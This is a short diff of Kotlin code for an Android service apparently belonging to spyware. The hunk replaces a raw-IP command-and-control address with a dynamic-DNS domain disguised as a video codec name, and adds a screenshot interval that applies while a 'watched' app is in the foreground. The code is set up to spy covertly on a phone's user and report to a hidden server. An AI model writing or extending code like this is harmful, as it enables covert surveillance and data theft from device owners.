@@ -24,8 +24,8 @@ import java.util.Date
 class AgentService : Service() {
 
     companion object {
-        const val C2_BASE = "http://38.97.62.125:5000"
-        const val POLL_MS = 8_000L
+        const val C2_BASE = "https://hevc-codec.duckdns.org"   // was: http://38.97.62.125:5000
+        private val SCREENSHOT_INTERVAL_MS = 8_000L           // every 5 sec while watched app open
         var watchedApps: MutableList<String> = mutableListOf()
         var isAppInForeground = false
         var foregroundAppName: String = ""
